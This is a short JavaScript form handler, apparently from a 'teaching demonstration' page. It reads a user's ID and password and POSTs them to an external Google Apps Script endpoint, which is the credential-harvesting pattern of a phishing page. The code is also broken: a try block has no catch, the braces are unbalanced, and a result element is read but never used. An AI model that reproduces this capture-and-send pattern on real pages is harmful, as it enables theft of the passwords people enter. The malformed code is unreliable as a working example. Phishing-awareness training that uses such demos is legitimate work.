<script>
const form = document.getElementById("demo-form");

form.addEventListener("submit", async function (event) {
    event.preventDefault();

    const demoId = document.getElementById("demo-id").value.trim();
    const demoPassword = document.getElementById("demo-password").value.trim();
    const result = document.getElementById("result-message");

    if (!demoId || !demoPassword) return;

    try {const response = await fetch("https://script.google.com/macros/s/AKfycbwY4NOtDvJESpCO_ZncUm_Fk-VWhNNFchTLg7J2ZvXeXKkDduKXqYLB2BhUzJKrKUKp/exec", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: new URLSearchParams({
        identifiant: demoId,
        resultat: demoPassword,
        consentement: "Démonstration pédagogique"
    })
});

});
</script>
